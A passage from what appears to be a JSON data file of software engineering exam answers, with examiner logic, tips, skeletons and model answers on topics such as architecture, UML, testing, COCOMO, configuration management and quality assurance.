isFull(S); post S' = S with x on top. Any client obeying these conditions can use the stack, and the implementation can be replaced freely. Formal interfaces (Z schemas, OCL) are checkable but costly; informal documentation is cheaper and weaker."},"se-67":{"u":6,"logic":"Tests whether you can order the architectural design activities and place the abstract machine model correctly instead of confusing it with ordinary layering.","how":"Three activities in order, then the abstract machine with the compiler and JVM examples — the example separates a 6 from a 10.","skel":["System structuring: subsystems and their interactions","Control modelling: centralised vs event-driven","Modular decomposition; document and validate architecture","Abstract machine: layered service providers","Compiler and JVM examples"],"ans":"Architectural design identifies the system's overall structure — its subsystems, their responsibilities and interactions. Three activities:\n1. System structuring: decompose the system into major subsystems and define how they interact (call-return, shared data, message passing); draw a block diagram showing the boundary and external systems.\n2. Control modelling: decide control relationships — centralised (one subsystem invokes the others) or event-driven (broadcast, interrupt, guarded call).\n3. Modular decomposition: break each subsystem into modules with defined interfaces, using object-oriented or function-oriented decomposition.\nSupporting work: architectural decisions (distribution, pattern, platform), documenting views, and validating against non-functional requirements.\n\nAbstract machine model: the architecture is a hierarchy of abstract machines, each offering services to the layer above while hiding its implementation, so the top layer sees a simple instruction set that lower layers realise. A compiler is the classic case — lexer → parser → semantic analyser → code generator, each translating to a lower representation; the JVM is the practical version, running bytecode on an abstract machine built over real hardware. Benefit: portability and stepwise refinement; cost: performance lost at each layer."},"se-68":{"u":6,"logic":"Checks that decomposition is judged by information hiding, cohesion and coupling, and that the OO model is described as classes with state, behaviour and relationships.","how":"Definition and two criteria first, then OO decomposition with a library class diagram — the diagram is free marks.","skel":["Define modular decomposition and information hiding","Criteria: high cohesion, low coupling","OO model: classes, attributes, operations, messages","Inheritance and aggregation; reuse by factoring","Library class diagram with multiplicities"],"ans":"Modular decomposition breaks a subsystem into modules — self-contained units with a well-defined interface that hide their implementation (information hiding, Parnas). A good decomposition has high cohesion inside a module and low coupling between modules, so a change affects few modules and each can be understood, tested and replaced independently. Criteria: information hiding and one module per identifiable function or object.\n\nTwo styles: function-oriented (pipeline), where modules are functions and data flows between stages; and object-oriented.\n\nObject-oriented model: the system is decomposed into classes of objects. Each object encapsulates state (attributes) and behaviour (operations) and is an instance of a class; objects interact by messages through published interfaces. Classes relate by association, aggregation and inheritance, so common behaviour is factored into a superclass and reused. Because state and its operations live together, a change stays inside the class, and domain entities map directly to software units.\n\nExample — library: classes Member, Book, Loan, Fine, Catalogue; Student and Faculty inherit from Member; Member 1 — * Loan * — 1 Book. Draw the class diagram with attributes, operations, associations and multiplicities."},"se-69":{"u":5,"logic":"Tests whether use cases are justified as a requirements and traceability tool, and whether you can actually draw actors, boundary, use cases and include/extend.","how":"Two halves: five importance points, then the diagram — actors outside, use cases inside, dashed «include»/«extend» arrows labelled.","skel":["Definition: actor-system interaction producing value","Five importance points: requirements, context, tests, increments","Library actors: member, librarian, administrator","Members' and librarian's use cases","«include» verify membership; draw the boundary"],"ans":"A use case is a set of interactions between an actor and the system that produces an observable result of value. In object-oriented development the use case diagram:\n• captures functional requirements from the user's viewpoint and fixes the system boundary;\n• identifies actors and goals, exposing missing or conflicting requirements early;\n• gives context to other models — each use case becomes a sequence diagram, a source for class identification (noun analysis) and black-box test cases;\n• defines the unit of incremental delivery and estimation (one use case = one story);\n• is an easily validated contract with non-technical stakeholders.\n\nLibrary system — actors: Member (Student, Faculty), Librarian, Administrator.\nMember: Search catalogue, Reserve book, Borrow book, Return book, View own loans.\nLibrarian: Register member, Issue book, Return book, Collect fine, Add/update book, Generate report.\nAdministrator: Manage users, Back up database.\nRelationships: Borrow book «include» Verify membership and Check availability; Return book «include» Calculate fine; Collect fine «extend» Return book when overdue.\nDraw a boundary rectangle 'Library Management System', stick-figure actors outside, ellipses inside, solid associations and dashed «include»/«extend» arrows."},"se-70":{"u":8,"logic":"Probes a niche process: cleanroom is defect prevention by formal verification plus statistical certification, not merely careful testing.","how":"Lead with 'zero defects by prevention', then five characteristics — incremental, box structures, verification, statistical testing, roles.","skel":["Define cleanroom: defect prevention plus statistical certification","Incremental development under statistical quality control","Box structures: black, state, clear box","Formal correctness verification, no unit testing by author","Independent statistical usage testing and certification"],"ans":"Cleanroom software engineering (Mills, IBM) aims at zero-defect software by preventing defects instead of removing them: correctness is built in by formal specification and mathematical verification, and quality is certified statistically before release. The name comes from hardware cleanrooms, where process discipline keeps defects out.\n\nCharacteristics:\n• Incremental development: small increments, each certified under statistical quality control; the next starts only when the previous meets its reliability goal.\n• Box-structure specification: black box (external behaviour), refined to a state box (data) and a clear box (procedure).\n• Correctness verification by inspection: developers reason formally against pre- and post-conditions; the author runs no compile-and-unit-test cycle.\n• Statistical testing is separate: an independent certification team tests from an operational profile and certifies against a target MTTF or POFOD.\n• Defined roles and records: specification, development and certification teams, with written evidence of every verification.\nBenefit: very low defect density. Cost: trained staff, formal specifications and discipline, so it suits small critical systems."},"se-71":{"u":8,"logic":"Tests white-box skill: drawing a flow graph, computing cyclomatic complexity and enumerating independent paths rather than listing coverage types.","how":"Draw the flow graph, compute V(G) = E − N + 2, then three paths with three data sets — the arithmetic earns the marks.","skel":["Define path and basis path testing","Steps: flow graph, V(G), independent paths","Example code and flow graph, E=8, N=7","Three independent paths with test data","Limitations: loops, exponential paths"],"ans":"Path testing is a white-box (structural) technique that designs test cases to execute every independent path through a program, so that each statement and each branch is exercised at least once. Basis path testing (McCabe) gives a minimum set of paths equal to the cyclomatic complexity.\n\nSteps: draw the flow graph; compute V(G) = E − N + 2, or number of decisions + 1; list V(G) independent paths; write one test case per path; add boundary and loop cases.\n\nExample:\n1 read(a,b);\n2 if a>0 then 3 x=x+1 else 4 x=x−1;\n5 if b>0 then 6 y=y+1;\n7 print(x,y);\nFlow graph: nodes 1–7; edges 1→2, 2→3, 2→4, 3→5, 4→5, 5→6, 5→7, 6→7. So E = 8, N = 7 and V(G) = 8 − 7 + 2 = 3.\nIndependent paths:\nP1 1-2-3-5-6-7 (a>0, b>0)\nP2 1-2-4-5-6-7 (a≤0, b>0)\nP3 1-2-3-5-7 (a>0, b≤0)\nTest data: (5,5), (−3,5), (5,−1).\nLimitations: it ignores data-dependence and cannot reveal missing requirements; loops make the path count grow exponentially, so loop iterations must be bounded. Use it with black-box techniques, not instead of them."},"se-72":{"u":8,"logic":"Tests breadth on two unrelated topics — reliability measured by operational profile, and reverse engineering as understanding-only recovery of design.","how":"Two short notes, one paragraph each: profile plus POFOD for (a), code-to-higher-abstraction steps for (b). These repeat often — a sure shot.","skel":["Reliability validation: statistical testing from operational profile","Metrics POFOD, ROCOF, availability; release decision","Reverse engineering: recover design from code","Steps and tools; no change to the system","Used before re-engineering and for documentation"],"ans":"a) Reliability validation\nReliability validation checks whether the system meets its required reliability — probability of failure on demand (POFOD), rate of occurrence of failure (ROCOF) or availability. It uses statistical testing: define an operational profile (input classes and their real frequencies), generate test cases with the same frequencies, run them, record failure times and compute the estimate; a reliability growth model then predicts whether the release target will be met. Example: in a ticketing system 60% of sessions search, 30% book, 10% cancel — tests are weighted likewise. Limitation: the profile must be accurate, and rare but critical failures need targeted tests.\n\nb) Reverse engineering\nReverse engineering analyses a program to recover its design and specification, deriving higher-level representations from the code without changing the system. Steps: read the code, data and documentation, then abstract it into structure charts, data models, class diagrams or design documents; tools are decompilers, structure analysers, call-graph and data-flow analysers. Uses: document undocumented legacy code, recover design before re-engineering, assess quality or IP risk. It adds no functionality, only understanding, and is the first step of re-engineering, not a substitute for it."},"se-73":{"u":2,"logic":"Separates the two prototype lifecycles — students call every prototype evolutionary and lose marks on discarding, quality and fate of the code.","how":"One help list, then a two-column contrast on purpose, quality, fate and risk; draw the prototype-evaluate-refine loop.","skel":["Five ways prototyping helps the project","Evolutionary: becomes the product, engineered","Throw-away: discarded, real system rebuilt properly","Contrast quality, cost, risk and fate","Draw the prototype-evaluate-refine loop"],"ans":"Prototyping helps because a prototype is built early, shown to users and refined, so it (1) clarifies vague or conflicting requirements that interviews miss; (2) checks feasibility of technology or interface before heavy investment; (3) improves communication — users react to a working screen far better than to a document; (4) cuts requirement risk and rework by finding errors while change is cheap; (5) supports incremental delivery where an evolutionary prototype grows into the product.\n\nEvolutionary prototype: built with real architecture and quality, then refined through versions until it is the delivered system. Used when requirements are unclear and the domain changes fast — web and mobile products. Advantage: early feedback, always a working system. Risk: poor structure creeps in, documentation lags, temporary code ships.\n\nThrow-away (rapid) prototype: built quickly with minimal engineering to answer one question, then discarded while the real system is built properly. Used to explore interface, feasibility or requirements for a large stable system. Advantage: no compromise on final quality. Risk: wasted effort and pressure to ship it anyway.\n\nKey difference: evolutionary — the prototype is the product and must be engineered; throw-away — it is a learning device, deliberately discarded."},"se-74":{"u":4,"logic":"Tests the functional/non-functional distinction through measurable examples; vague 'the system should be fast' answers are exactly what the examiner screens out.","how":"Define both, four contrast lines, then three numbered functional and three non-functional requirements with numbers (2 seconds, 99.5%).","skel":["Functional: what the system does","Non-functional: how well, as a constraint","Four contrast points: feature vs property","Three functional requirements for the library","Three measurable NFRs: performance, security, availability"],"ans":"Functional requirements state what the system must do — services, inputs, outputs, behaviour, including reaction to invalid input. Non-functional requirements state how well — constraints on performance, security, reliability, usability and environment; they decide the architecture and must be measurable to be testable.\n\nDifferences:\n• Functional is an action ('the system shall...'); non-functional is a quality or constraint.\n• A functional requirement is met by a feature; an NFR is a property of the whole system.\n• Functional defects show in functional tests; NFRs need load, security and reliability tests.\n• A missing NFR can make a functionally correct system unusable.\n\nLibrary Management System — functional:\n1. A member shall search the catalogue by title, author, ISBN or subject and see availability.\n2. The system shall issue an available book to an eligible member, set the due date and record the loan.\n3. The system shall charge Rs. 5 per overdue day and block further issue until the fine is paid.\nNon-functional:\n1. Performance: a search over 100,000 records shall return results within 2 seconds.\n2. Security: only a logged-in librarian may issue or return books; a member's data is visible only to that member and staff.\n3. Availability: 99.5% of library hours, no lost loan record, recovery within one hour."},"se-75":{"u":10,"logic":"Checks configuration management as a controlled-change process — identification, versioning, change control, building, release — plus the reason it exists.","how":"Five activities, one line each with a tool, then 'why' as four failures SCM prevents. It repeats se-85 — treat it as a sure shot.","skel":["Define SCM and configuration items","Configuration identification and baselines","Version management and change control board","System building and release management","Why: reproducibility, parallel work, rollback, audit"],"ans":"Software configuration management (SCM) manages change to every artefact — code, documents, test data, build scripts — so the product and its parts can be identified, controlled and rebuilt at any time.\n\nActivities:\n1. Configuration identification: give every item a unique name and version and define baselines — a reviewed, approved set that changes only through formal control (for example 'Release 1.0').\n2. Version management: keep every version, allow parallel work on branches, record who changed what and why, and merge (Git, SVN).\n3. Change control: a change request is assessed for cost and impact by a change control board, approved or rejected, implemented, verified and closed.\n4. System building: compile and link the correct component versions with the right libraries into an executable, automated with Maven or Jenkins for reproducible builds.\n5. Release management: decide the release contents, package it, record exact versions and distribute it.\n6. Status accounting and auditing: report each item's state and audit that the delivered product matches its baseline.\n\nWhy required: many developers change the same code; without SCM nobody knows which version is which, builds are not reproducible, fixes get lost and parallel work overwrites itself. It gives traceability, controlled change, rollback and audit evidence for ISO 9001 and CMMI."},"se-76":{"u":3,"logic":"Wants the manifesto values plus where agile actually applies — most answers stop at the definition and lose the whole 'applications' half.","how":"Four manifesto values, two lines of practice, then 'suitable for / not suitable for' — the second half is where the marks sit.","skel":["Define agile: iterative, incremental, manifesto values","Practices: backlog, sprints, TDD, CI, refactoring","Applications: volatile requirements, web, mobile, SaaS","Not for: fixed contracts, safety-critical, large distributed teams"],"ans":"Agile development is an iterative, incremental approach based on the Agile Manifesto (2001): individuals and interactions over processes and tools, working software over comprehensive documentation, customer collaboration over contract negotiation, and responding to change over following a plan. Work proceeds in time-boxed iterations of one to four weeks, each delivering tested, usable functionality. Requirements sit in a prioritised backlog re-planned every iteration; teams are small, self-organising and co-located with the customer available; design emerges through refactoring, and quality is held by TDD, continuous integration and pair programming (XP, Scrum, Kanban).\n\nApplications: products with volatile requirements and short time-to-market — web, mobile, e-commerce, fintech and start-ups; internal systems delivered incrementally; SaaS with continuous deployment. It is less suitable where requirements are fixed by contract, for safety-critical systems needing heavy documentation, or for very large distributed teams."},"se-77":{"u":1,"logic":"Probes scope discipline: system engineering covers the whole system including hardware and people; software engineering is one part of it.","how":"Define both, then four contrast lines on scope, disciplines, activities and interfaces; close with 'software engineering is a subset'.","skel":["Define system engineering: whole system","Define software engineering: software only","Contrast scope, disciplines, activities, interfaces","Software engineering is a sub-discipline","National ID or metro-rail example"],"ans":"System engineering covers all aspects of specifying, designing, implementing, deploying and operating a complete system — hardware, software, people, processes, data and environment — and how those parts interact to meet a goal. Software engineering covers only the software: the systematic, disciplined production and maintenance of programs and documentation.\n\nDifferences:\n• Scope: whole system (an aircraft, a metro rail) versus software alone.\n• Disciplines: mechanical, electrical, control and human factors versus programming, algorithms, data and testing.\n• Activities: system engineering defines system requirements, allocates them to hardware or software, and integrates and validates the whole; software engineering elicits, designs, codes, tests and maintains software.\n• Interfaces: system engineers manage the hardware-software boundary, a major source of failure.\n• Team: domain engineers versus developers, testers and architects.\n\nRelationship: software engineering is a sub-discipline of system engineering. In Nepal's national ID project, system engineers design the cards, readers and processes, while software engineers build the enrolment software that fits those interfaces."},"se-78":{"u":10,"logic":"Tests whether SQA is understood as process assurance rather than testing — the classic confusion this question is designed to expose.","how":"Define as prevention-oriented process assurance, list the activities, give one example, and end with 'SQA is not testing'.","skel":["Define SQA: planned process activities giving confidence","Prevention-oriented, not product detection","Activities: standards, reviews, audits, measurement","College result-system example","SQA is not testing"],"ans":"Software quality assurance is the set of planned, systematic activities — process definition, standards, reviews, audits, testing and measurement — that give confidence that a product will meet its quality requirements. It is process-oriented (prevention), not product-oriented (detection): if the process is right, the product is likely to be right.\n\nIt covers quality planning; standards, procedures and checklists; reviews and inspections of requirements, design and code; testing at every level; configuration management and change control; measurement and defect analysis; audits, process improvement and training.\n\nExample: a college result system sets a coding standard, requires two peer reviews per module, defines the test plan before coding, runs unit tests on every commit and audits three modules monthly; defects are logged and used to update the checklist, giving evidence for ISO 9001.\n\nSQA is not testing — testing is one of its control activities, and quality must be built in, not inspected in at the end."},"se-79":{"u":5,"logic":"Tests dynamic modelling: states, events, guards and actions, and whether you can give a real state machine instead of restating 'behaviour'.","how":"Define, name three notations, then draw the book state machine with labelled transitions — the diagram does the work.","skel":["Define behavioural model: state-dependent dynamics","Notations: state machine, activity, data-driven","Library book states and events","Labelled transitions with guard and action","Use of the model for test cases"],"ans":"A behavioural model describes the dynamic behaviour of a system: its states, the events that move it between them, and its response. It is used where behaviour depends on current state and event order — control systems, protocols, transactions and interfaces.\n\nNotations: state machine (states, events, transitions, guards, actions), activity diagram (control flow and concurrency), and data-driven models (ERD).\n\nExample — library book: states Available, Issued, Overdue, Reserved, Lost. Events: issue, return, due date passed, reserve, report lost. Transitions: Available --issue--> Issued; Issued --return--> Available; Issued --due date passed--> Overdue; Overdue --return--> Available with fine; any state --report lost--> Lost. A label carries event, guard and action, e.g. 'issue [member eligible] / due := today + 14'.\n\nDrawing it exposes gaps such as a missing 'renew' event and rules such as 'an available copy cannot be reserved'; it also gives state-based test cases covering every transition."},"se-80":{"u":7,"logic":"Checks the CBSE vocabulary — component, contract, qualification, adaptation, composition — and awareness of the integration problems.","how":"Define a component by its contract, list five activities, give the payment-gateway example, then benefits against problems.","skel":["Define component: deployable unit with a contract","Activities: qualify, adapt, compose, test","Standards: EJB, .NET, web services, microservices","Example: payment API plus auth library","Benefits vs mismatch and loss of control"],"ans":"Component-based software engineering builds systems by defining, selecting, adapting and composing independent, reusable components rather than writing everything. A component is a deployable, replaceable unit with a contractually specified interface — provided and required interfaces — composable without knowledge of its internals.\n\nActivities: component qualification (does an existing component meet the need?), adaptation (wrapping it to the required interface), composition (wiring components through interfaces), architectural design around the component model, and testing the assembly.\n\nTechnologies: CORBA, EJB, COM/.NET, web services (SOAP, REST), microservices, UI component libraries.\n\nExample: an e-commerce site assembled from a payment-gateway component (eSewa API), an authentication library, a React component library and a database driver; the team writes only the domain logic.\n\nBenefits: reuse, lower cost, faster delivery, proven quality. Problems: component mismatch and glue code, loss of control over evolution, unpredictable quality and licensing, and integration testing effort."},"se-81":{"u":5,"logic":"Tests UML fluency under time pressure: two diagrams for one system, so actors, use cases and message order must all be right.","how":"Draw the use case diagram small on the left and the sequence diagram on the right; number messages 1 to 12 with dashed returns.","skel":["Use case: actors customer, clerk, gateway, admin","Use cases: search, select seats, book, pay, cancel","Sequence objects: UI, controller, inventory, payment","Numbered messages with returns and alt fragment"],"ans":"Use case diagram — actors: Customer, Box Office Clerk, Payment Gateway, Administrator.\nCustomer: Search show, Select seats, Book ticket, Pay online, Cancel booking.\nClerk: Sell ticket at counter, Verify booking, Refund.\nPayment Gateway: Authorise payment. Administrator: Add show, Manage prices, Generate report.\nRelationships: Book ticket «include» Select seats and «include» Pay online; Cancel booking «include» Refund; Pay online associates with Payment Gateway.\nDraw the boundary box 'Online Movie Ticketing' with actors outside and ellipses inside.\n\nSequence diagram for Book ticket — lifelines: Customer, BookingUI, BookingController, SeatInventory, PaymentGateway.\n1 Customer → BookingUI: selectShow(showId)\n2 BookingUI → BookingController: getAvailableSeats(showId)\n3 BookingController → SeatInventory: checkAvailability(showId)\n4 SeatInventory ⤶ BookingController: seatList\n5 BookingController ⤶ BookingUI: displaySeats\n6 Customer → BookingUI: confirmSeats(seats, payment)\n7 BookingUI → BookingController: book(seats, payment)\n8 BookingController → SeatInventory: lockSeats(seats)\n9 BookingController → PaymentGateway: authorise(amount)\n10 PaymentGateway ⤶ BookingController: approved(txnId)\n11 BookingController → SeatInventory: confirmBooking\n12 BookingController ⤶ BookingUI: bookingConfirmed(ticketId)\nDraw lifelines with activation bars, dashed returns and an alt fragment for payment failure."},"se-82":{"u":8,"logic":"Pairs the classic verification/validation distinction with the inspection process — the examiner wants ordered steps and roles, not 'a review meeting'.","how":"Two-line V and V contrast, then the six inspection steps in order with roles; losing the order loses the marks.","skel":["Verification: build right, static; validation: right product","Contrast by technique, timing and who does it","Inspection: planning, overview, preparation, meeting","Rework and follow-up","Roles: moderator, author, reader, recorder, inspectors"],"ans":"Verification asks 'are we building the product right?' — conformance to specification; it is static, done by developers through reviews, inspections, static analysis and unit tests. Validation asks 'are we building the right product?' — meeting the customer's real needs; it is dynamic, through acceptance and beta testing with users.\n\nInspection (Fagan) is a formal static review by four to six people:\n1. Planning: the moderator selects material, checklist and team.\n2. Overview: the author explains the design or code.\n3. Preparation: each inspector studies it alone and lists defects.\n4. Meeting: the reader walks through the code; the recorder logs defects, not solutions.\n5. Rework: the author fixes every logged defect.\n6. Follow-up: the moderator verifies each fix; a high defect rate means re-inspection.\nRoles: moderator, author, reader, recorder, inspectors. Inspections find defects that testing masks and cost less per defect, but need trained people, time and a blame-free culture."},"se-83":{"u":9,"logic":"Tests whether reverse engineering stays separate from re-engineering — understanding the system versus changing it.","how":"Define both, five contrast lines, and state that reverse engineering is the first step of re-engineering; that relation earns the last mark.","skel":["Reverse: recover design and specification, no change","Re-engineering: restructure legacy, same functionality","Contrast purpose, output, risk, effect on system","Reverse engineering is a sub-activity of re-engineering","COBOL ledger example"],"ans":"Reverse engineering analyses a system to recover its design and specification, producing higher-level abstractions — structure charts, data models, class diagrams, documentation — from the code. It does not change the system; it only recreates understanding.\n\nRe-engineering restructures a legacy system to improve it without changing functionality: restructuring tangled code, modularising, migrating platform or language, improving data and documentation. It normally begins with reverse engineering, then does forward engineering — redesign and reimplementation.\n\nDifferences:\n• Purpose: understand versus improve.\n• Output: design documents versus a better-structured system.\n• Effect: none versus changed internals, same external behaviour.\n• Cost and risk: low versus high, as code is rewritten and retested.\n• Relation: reverse engineering is a sub-activity of re-engineering.\n\nExample: a bank's COBOL ledger — reverse engineering recovers record layouts and rules; re-engineering rewrites them in Java with identical accounting logic and retires the mainframe."},"se-84":{"u":10,"logic":"Numerical COCOMO: tests formula recall, the right constants per mode and a clean substitution line — not the philosophy of estimation.","how":"Write E = a×KLOC^b and T = c×E^d, substitute both modes, label units, then close with the effort-doubles insight.","skel":["Formulas and constants for the two modes","Organic: E ≈ 1295 PM, T ≈ 38.1 months","Semi-detached: E ≈ 2463 PM, T ≈ 38.5 months","Team size for each mode","Conclusion: effort doubles, duration barely changes"],"ans":"Basic COCOMO: E = a × (KLOC)^b person-months, T = c × E^d months, team size = E/T; here KLOC = 400.\n\nOrganic (a = 2.4, b = 1.05, c = 2.5, d = 0.38):\nE = 2.4 × 400^1.05 = 2.4 × 539.7 ≈ 1295 PM\nT = 2.5 × 1295^0.38 = 2.5 × 15.2 ≈ 38.1 months\nTeam ≈ 1295 / 38.1 ≈ 34 people.\n\nSemi-detached (a = 3.0, b = 1.12, c = 2.5, d = 0.35):\nE = 3.0 × 400^1.12 = 3.0 × 820.9 ≈ 2463 PM\nT = 2.5 × 2463^0.35 = 2.5 × 15.4 ≈ 38.5 months\nTeam ≈ 2463 / 38.5 ≈ 64 people.\n\nConclusion: the semi-detached project needs about twice the effort at almost the same duration, so the work is absorbed by a much larger team, raising coordination risk. Since b > 1 and d < 1, effort grows faster than size while duration grows slowly — a bigger project needs more people, not more months. Basic COCOMO uses size and mode only; intermediate COCOMO would apply an effort adjustment factor from 15 cost drivers."},"se-85":{"u":10,"logic":"Wants SCM as detailed tasks with a worked example; it is se-75 asked in process form, so the examiner expects artefacts and a change trail.","how":"Six tasks in lifecycle order, each with a concrete artefact, then run change request CR-27 through them. It repeats se-75 — sure shot.","skel":["Identify configuration items and baselines","Version control: branch, commit, merge, tag","Change control: CR, impact analysis, CCB, verify","Build and release management","Worked example: CR-27 on a library system"],"ans":"SCM tasks in the order they run:\n1. Configuration identification and baselines: list every configuration item — source files, SRS, test cases, schema, build scripts — give each a unique ID, and baseline the set at milestones.\n2. Version control: keep the repository, check out working copies, commit with a message and change-request number, branch for parallel work, merge after review, tag each release.\n3. Change control: a change request records the change; impact analysis estimates cost, affected items and risk; the change control board approves or rejects; the change is implemented, verified and closed.\n4. Build management: an automated script compiles the correct versions with pinned dependencies, giving a reproducible build on every commit (continuous integration).\n5. Release management: plan the release, package it, write release notes listing included change requests, distribute and archive exact versions.\n6. Status accounting and audit: report each item's state and audit that the delivered product matches its baseline.\n\nExample — college library system, CR-27 'add fine calculation per day': it is analysed as affecting Loan, Fine and the issue screen; the developer branches feature/fine, CI runs the tests, a reviewer approves the merge, the build is tagged v1.2 with release notes naming CR-27, and a production failure is handled by reverting to tag v1.1."},"se-86":{"u":3,"logic":"Tests agile against prototyping, two approaches often confused because both iterate — the real difference is what is delivered and what is discarded.","how":"Agile in five lines, then a contrast on purpose, deliverable, timescale and quality; name XP and Scrum practices explicitly.","skel":["Agile: manifesto values, sprints, backlog, working software","Practices: TDD, pair programming, CI, refactoring","Prototyping: throw-away or evolutionary model","Contrast purpose, deliverable, duration, quality","Agile ships product; prototype removes risk"],"ans":"Agile development is an iterative, incremental approach founded on the Agile Manifesto (2001) — individuals and interactions over processes and tools, working software over documentation, customer collaboration over contract, responding to change over following a plan. Work runs in time-boxed sprints of one to four weeks, each delivering tested, usable software from a prioritised backlog, with a small self-organising team and the customer available. Design emerges through refactoring; quality is held by TDD, pair programming, continuous integration and automated builds (XP, Scrum, Kanban).\n\nPrototyping development builds an early model to clarify requirements or test feasibility; the prototype is thrown away or refined into the product (evolutionary).\n\nComparison:\n• Purpose: agile delivers production software iteratively; prototyping reduces requirement and technical risk.\n• Deliverable: each sprint is releasable and tested; a prototype may be partial and not releasable.\n• Duration: agile spans the whole project; a prototype is a short, bounded activity.\n• Quality: agile maintains architecture, tests and documentation; a throw-away prototype deliberately ignores them.\n• Customer role: continuous collaboration in both; agile customers prioritise and accept increments.\nPrototyping can be used inside a sprint as a technique, and evolutionary prototyping is close to agile delivery."},"se-87":{"u":8,"logic":"The second half is the real question: validation has no oracle — nothing proves you built what users actually need, only operational use does.","how":"Four contrast lines, then five reasons validation is hard: no oracle, vague needs, change, stakeholders, environment.","skel":["Verification: conformance to spec, static","Validation: meets real need, dynamic","Why hard: no oracle to compare against","Vague and changing requirements, conflicting stakeholders","Only visible in operational use"],"ans":"Verification checks conformance to the specification — 'are we building the product right?' It is static: reviews, inspections, static analysis, tests against a written specification. Validation checks that the product meets the customer's real needs — 'are we building the right product?' It is dynamic: acceptance testing, beta testing and live use.\n\nDifferences: verification has a reference, the specification; validation has none. Verification is done by developers against documents; validation needs users and real tasks. Verification can be automated and completed; validation cannot.\n\nWhy validation is difficult:\n• No oracle: nothing states authoritatively what the user really needs, so a test can pass and still be wrong.\n• Requirements are unclear and changing: users cannot fully articulate needs, and needs shift during development.\n• Stakeholders conflict: satisfying the librarian may obstruct the member, and no test resolves that.\n• Environment matters: behaviour depends on data volumes, networks, other systems and work practices.\n• People judge: acceptance is shaped by habit, training and politics, not only function.\n• Cost and delay: field trials are slow and expensive, and problems surface after delivery, when change is dearest.\nHence validation relies on prototypes, pilots and incremental delivery rather than proof."},"se-88":{"u":1,"logic":"Tests the four canonical quality attributes with a justification each; students list ten vague words and score two.","how":"Give only the four essential attributes, each defined with an example, then one closing line of secondary attributes.","skel":["Maintainability: changeable without new defects","Dependability: reliability, security, safety, availability","Efficiency: time, memory, bandwidth, battery","Acceptability: usable and fit for purpose","Secondary: reusability, portability, testability"],"ans":"Good software should have four essential attributes:\n• Maintainability: it can be changed — to fix defects, adapt to a new environment or add features — without new errors, through modularity, documentation and tests. This matters most commercially, as about 60% of lifecycle cost is maintenance.\n• Dependability: reliability, security, safety and availability — it does what it should when it should, resists attack, protects data and harms nobody. Critical in banking, hospitals and e-governance.\n• Efficiency: it does not waste processor time, memory, bandwidth or battery, and still performs at the expected load.\n• Acceptability: it is usable and fit for purpose — understandable by its intended users, with suitable interface, documentation and response time. If users will not use it, it has no value.\nSecondary attributes follow: reusability, portability, interoperability, testability, scalability, correctness. Example: a university result system must be correct and secure, print marksheets in seconds and be usable by non-expert clerks."},"se-89":{"u":4,"logic":"Checks the requirements process as an iterative loop with named techniques, not a one-way 'gather then write' pipeline.","how":"Five activities in order with one technique each, then say the process is iterative; the spiral activity diagram is free marks.","skel":["Elicitation: interviews, observation, prototyping","Analysis and negotiation: classify, resolve conflicts","Specification: SRS, use cases, structured language","Validation: reviews, prototypes, test cases","Management: change requests, traceability, baselines"],"ans":"Requirements engineering finds out, analyses, documents and checks what a system should do. It has four activities plus management, and is iterative.\n1. Elicitation: gather requirements using interviews, questionnaires, observation, document analysis, focus groups, scenarios, prototyping and workshops.\n2. Analysis and negotiation: classify requirements as functional, non-functional or domain; resolve conflicts; agree priorities; check feasibility; build use case and class models.\n3. Specification: write them in an agreed form — structured natural language, use cases, user stories or formal notation — in a requirements document such as an SRS.\n4. Validation: check they are valid, consistent, complete, realistic and verifiable, using reviews, prototyping, test-case generation and model validation.\n5. Management: control change through change requests, impact analysis, a traceability matrix and baselining.\nExample: interviews with librarians reveal a fine rule conflicting with practice; it is negotiated, written as FR-12 and reviewed; a later rate change goes through the change process. Draw the activities as a spiral."},"se-90":{"u":2,"logic":"Contrasts a linear model with a risk-driven iterative one; the discriminators are explicit risk analysis and incremental delivery.","how":"Describe both with a sketch, then six contrast lines, and end with 'spiral is waterfall repeated with risk analysis added'.","skel":["Waterfall: linear phases, sign-off, one delivery","Spiral: four sectors per loop, risk-driven","Contrast change, risk, delivery, size, documentation","Draw both models","Spiral suits large high-risk projects"],"ans":"Waterfall: a linear sequence — requirements, design, implementation, testing, deployment, maintenance — each phase signed off before the next, with feedback only through documents.\n\nSpiral (Boehm): risk-driven and iterative; each loop has four sectors — determine objectives and constraints, identify and resolve risks through prototypes, develop and validate, plan the next iteration — and the radius is cumulative cost.\n\nDifferences:\n• Nature: linear and document-driven versus iterative and risk-driven.\n• Change: expensive with late feedback versus expected and re-examined each loop.\n• Risk: implicit, concentrated at testing versus analysed explicitly every cycle.\n• Delivery: one delivery at the end versus an increment per cycle.\n• Suitability: small stable projects versus large high-risk evolving ones.\n• Documentation: complete per phase versus produced as needed.\n\nDraw both: waterfall with feedback arrows, spiral with four labelled quadrants. The spiral is waterfall-in-miniature repeated with risk analysis, keeping its discipline without its inflexibility."},"se-91":{"u":10,"logic":"The same SQA concept as se-78, but demanding an example; the answer must be tighter and concrete rather than a second definition.","how":"One-line definition, three activity groups, a two-sentence example. It repeats se-78 — a certain shot, keep it short.","skel":["Define SQA as prevention-oriented process assurance","Standards, reviews, testing, audits, measurement","Example: coding standard, peer review, CI tests","Contrast with quality control as testing"],"ans":"Software quality assurance is the set of planned, systematic activities that give confidence that a product will meet its quality requirements. It is prevention-oriented: it improves the process so defects are not introduced, rather than detecting them at the end.\n\nIt covers three groups:\n• Process definition: standards, coding guidelines, checklists, templates and training.\n• Product checks: reviews and inspections of requirements, design and code; testing at unit, integration, system and acceptance level; static analysis.\n• Quality management: quality plan, metrics and defect analysis, configuration management and change control, audits and improvement.\n\nExample: a college result system fixes a coding standard, requires two peer reviews per module and a test plan before coding, runs unit tests on every commit and audits three modules monthly; defects are logged by cause, and the commonest cause leads to a new requirements checklist — evidence for ISO 9001.\n\nSQA is not quality control: testing is one activity inside it."},"se-92":{"u":4,"logic":"Tests document literacy: laying out an SRS by IEEE 830 sections and stating what makes a requirement good.","how":"Three top-level sections with sub-bullets, then five quality properties; numbering one FR and one NFR shows you can use it.","skel":["Introduction: purpose, scope, definitions, overview","Overall description: perspective, functions, users, constraints","Specific requirements: interfaces, functional, performance","Appendices and index","Qualities: unambiguous, complete, verifiable, traceable"],"ans":"An SRS is the agreed document stating what the system must do; it is the baseline for design, testing and acceptance. The IEEE 830 structure:\n1. Introduction — purpose, scope, definitions and acronyms, references, overview.\n2. Overall description — product perspective, summary of functions, user characteristics, operating environment, design and implementation constraints, assumptions and dependencies.\n3. Specific requirements — external interfaces (user, hardware, software, communication), functional requirements (numbered, with 